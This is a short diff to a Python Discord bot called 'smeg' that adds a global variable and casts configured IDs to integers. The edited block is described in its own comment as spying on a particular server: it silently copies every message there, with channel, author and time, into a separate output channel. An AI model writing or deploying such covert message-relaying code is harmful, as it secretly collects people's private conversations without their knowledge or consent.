@@ -44,6 +44,7 @@ def stripprefix(text, prefix): # it looks better ok
 
 @client.event
 async def on_ready():
+    global lurkchannel
     print('We have logged in as {0.user}'.format(client))
     game = discord.Game("smeg help")
     await client.change_presence(status=discord.Status.online, activity=game)
@@ -53,9 +54,9 @@ async def on_message(message):
     if message.author == client.user:
         return
 
-    if message.guild.id == TARGET_SERVER_1:   # spies on a certain server, if you are in that server congratulations
-        header = "#" + str(message.channel) + " - [" + str(message.author) + "] " + str(message.created_at.utcnow())[0:-7] + " UTC\n"
-        channel = client.get_channel(OUTPUT_CHANNEL_1)  # output channel
+    if message.guild.id == int(TARGET_SERVER_1):  # spies on a certain server, if you are in that server congratulations
+        header = ("#" + str(message.channel) + " - [" + str(message.author) + "] " + str(message.created_at.utcnow())[0:-7] + " UTC\n")
+        channel = client.get_channel(int(OUTPUT_CHANNEL_1))  # output channel
         await channel.send(header + message.content)
 
     if message.content.startswith("smeg "):
